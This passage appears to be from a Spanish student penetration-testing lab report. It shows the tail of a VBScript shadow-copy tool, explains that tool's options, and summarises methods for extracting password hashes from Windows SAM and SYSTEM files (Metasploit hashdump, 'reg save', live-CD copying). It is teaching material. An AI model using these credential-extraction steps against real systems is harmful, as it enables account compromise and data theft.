    Do Until objTextFile.AtEndOfStream
      strNextLine = objTextFile.Readline
      if InStr(strNextLine,"REM build_off") = 3 Then
        build = 0
      End If
      if strNextLine <> "" and build = 1 Then
        strNextLine = Replace(strNextLine,"&","^&")
        strNextLine = Replace(strNextLine,">","^>")
        strNextLine = Replace(strNextLine,"<","^<")
        wscript.Echo "echo " & strNextLine & " >> " & args.Item(1)
      End If
      if InStr(strNextLine,"REM build_on") = 3 Then
        build = 1
      End If
    Loop
    wscript.Quit(0)
  REM build_on

End Select
```

El código, es un script de Visual Basic Script (VBs) diseñado para gestionar copias de sombra (*Volume Shadow Copies*) en Windows. 

Las principales secciones del código son:

**Argumentos y Uso**:
Se obtienen los argumentos pasados al script. Si no se proporciona un argumento, el script imprime las opciones disponibles para el uso de la herramienta.

**Interacción con WMI**:
El script utiliza Windows Management Instrumentation (WMI) para interactuar con el sistema operativo y obtener información sobre las copias de sombra.
strComputer = "." indica que las operaciones se realizarán en la máquina local.

**Opciones del Script**:
El script puede manejar diferentes opciones basadas en el primer argumento pasado. Aquí están algunas de las funciones más relevantes:

|Argumento| Descripción|
|---------|------------|
|*/list*|Enumera todas las copias de sombra actuales y muestra información detallada sobre cada una.|
|*/start*| Inicia el servicio de copias de sombra.|
|*/stop*| Detiene el servicio de copias de sombra.|
|*/status*| Muestra el estado del servicio de copias de sombra.|
|*/mode*| Permite ver o cambiar el modo de inicio del servicio de copias de sombra (manual, automático, deshabilitado).|
|*/create*| Crea una nueva copia de sombra en la unidad especificada.|
|*/delete*| Elimina una copia de sombra especificada o todas las copias.|
|*/mount*| Monta una copia de sombra a un directorio especificado.|
|*/execute*| Ejecuta un archivo desde una copia de sombra montada.|
|*/store*| Muestra estadísticas de almacenamiento sobre las copias de sombra.|
|*/size*| Establece el tamaño máximo de almacenamiento reservado para las copias de sombra.|
|*/build*| Imprime un script que puede ser reutilizado.|

**Manejo de Servicios**:
Para iniciar o detener el servicio de copias de sombra, el script consulta el servicio WMI correspondiente (*Win32_Service*).

**Creación y Eliminación de Copias de Sombra**:
La creación de copias de sombra utiliza Win32_ShadowCopy, mientras que la eliminación verifica el ID de la copia a eliminar.

**Montaje y Ejecución**:
Para montar y ejecutar archivos, el script crea enlaces simbólicos y ejecuta procesos en el contexto de las copias de sombra.

Este script como herramienta, puede ser útil tanto para la recuperación de datos, así como para propósitos de análisis forense, permitiendo acceder a versiones anteriores de archivos y carpetas, manipulando desde la línea de comandos.


## **Actions on Object**
Después de establecer comunicación con el sistema objetivo, el atacante ejecuta comandos según el tipo de ataque:
- **Ataques Masivos**: Buscan acceder a múltiples sistemas, obteniendo credenciales de bancos y redes sociales. Utilizan botnets para DDoS y minería de criptomonedas.
- **Ataques Dirigidos**: Son más sofisticados y buscan información confidencial y credenciales. También pueden intentar propagarse por la red y causar daños al sistema.

En ambos casos, los objetivos pueden incluir tanto la exfiltración de datos como la destrucción del hardware.


### 14. Describir qué son los archivos SAM y SYSTEM localizados en la carpeta Windows\System32\Config.
**Archivo SAM (Security Account Manager)**: 
- El archivo SAM es una base de datos que almacena información sobre las cuentas de usuario y sus contraseñas en un sistema Windows. Contiene datos encriptados sobre los usuarios locales, incluyendo nombres de usuario y los hashes de sus contraseñas.
- La estructura de este archivo permite que el sistema valide las credenciales de inicio de sesión. Sin embargo, no almacena las contraseñas en texto claro, sino que las almacena en forma de hashes para mayor seguridad.

**Archivo SYSTEM**: 
- El archivo *SYSTEM* contiene la configuración del registro de Windows relacionada con la configuración del sistema, incluyendo información sobre hardware, controladores y configuraciones del sistema operativo.
- Este archivo también incluye información crítica para el funcionamiento de la autenticación de usuarios, como las claves de los perfiles de usuario y otros datos relacionados con la seguridad.


### 15. ¿Cómo es posible extraer la información contenida en los archivos SAM y SYSTEM?
Para extraer información de los archivos *SAM* y *SYSTEM*, se pueden seguir varios métodos:

**Uso de Herramientas Forenses**:
Herramientas como chntpw, Ophcrack y Cain & Abel pueden ser utilizadas para extraer y analizar los hashes de las contraseñas almacenadas en el archivo *SAM*. Estas herramientas suelen tener capacidades para leer directamente los archivos sin necesidad de un inicio de sesión.

**Arranque desde un Medio Alternativo**:
Se puede arrancar el sistema desde un medio alternativo, como un Live CD de Linux, para acceder a la carpeta *C:\Windows\System32\Config* y copiar los archivos *SAM* y *SYSTEM*. Luego, estos archivos se pueden analizar con herramientas forenses.

**Uso de Metasploit**:
Metasploit tiene módulos específicos, como *post/windows/gather/hashdump*, que permiten extraer los hashes de las contraseñas de las sesiones de Windows activas, accediendo a los archivos *SAM* y *SYSTEM* de forma remota.

**Acceso al Registro de Windows**:
Desde una sesión con privilegios administrativos, se puede usar el comando reg save para guardar las secciones relevantes del registro, que pueden incluir la información de usuarios y contraseñas en formato legible.


## **Conclusions**

### 16. Redactar sus conclusiones en las cuáles debe abordar:

#### a. ¿Qué es lo que ha aprendido de esta sesión de laboratorio?
Durante esta sesión de laboratorio, he adquirido conocimientos fundamentales sobre diversas herramientas y técnicas utilizadas en pruebas de penetración. He aprendido a utilizar herramientas de Kali Linux y Metasploitable, lo que me ha permitido comprender mejor el entorno de ataque y sus vulnerabilidades. La práctica del reconocimiento de puertos ha sido esencial para identificar los diferentes servicios activos, así como para detectar posibles vulnerabilidades en versiones de software más antiguas que aún no han sido explotadas.

Además, he explorado el acceso por fuerza bruta utilizando diccionarios, lo que resalta la importancia de la seguridad en la gestión de contraseñas. La investigación sobre scripts desarrollados por la comunidad, especialmente aquellos disponibles en plataformas como GitHub, ha ampliado mi perspectiva sobre los recursos disponibles para mejorar mis habilidades.

He comprendido que los scripts son herramientas poderosas, pero deben ser utilizados dentro de un marco secuencial, como el descrito en el Kill Chain, para ser efectivos. También he reconocido la existencia de archivos críticos en el directorio System32 de Windows, que son relevantes en la explotación de vulnerabilidades.

<!-- - Utilizar algunas herramientas de Kali y metasploitable.
- Reconocimiento de puertos para diferentes tipos de servicios.
- Versiones anteriores pueden presentar vulnerabilidades que aún no han sido explotadas.
- Acceso por fuerza bruta mediante diccionarios para la identificación del password del usuario.
- A investigar scripts desarrollados por terceros o la comunidad quiénes comparten sus conocimientos en GitHub.
- Los scripts son solo herramientas, hay que tener una secuencia, éstos pasos son descritos por el Kill-Chain.
- Reconocimiento de la existencia de archivos importantes en el System32. -->

#### b. ¿Qué herramientas nuevas ha añadido a sus skills?
- **Kali Linux**: He profundizado en el uso de esta distribución especializada en pruebas de penetración.
- **Nmap**: Aprendí a utilizar esta herramienta para el escaneo de redes y reconocimiento de puertos.
- **Terminal**: Mejoré mis habilidades en la línea de comandos, fundamental para la ejecución de diversas herramientas.
- **Windows Server**: Familiaricé con el entorno de Windows Server, lo cual es crucial en el contexto de pruebas de seguridad en sistemas empresariales.

<!-- - Kali Linux
- Nmap
- Terminal
- Windows Server -->

#### c. Otros temas que Ud. considere importante mencionar.
Un aspecto crítico que considero importante mencionar es la necesidad de explorar medidas de defensa y detección en ciberseguridad. Sería valioso investigar cómo las organizaciones pueden rastrear y mitigar las acciones de un atacante que ha logrado extraer datos de sus sistemas. Esto incluye implementar soluciones de monitoreo y/o detección de intrusiones, etc.
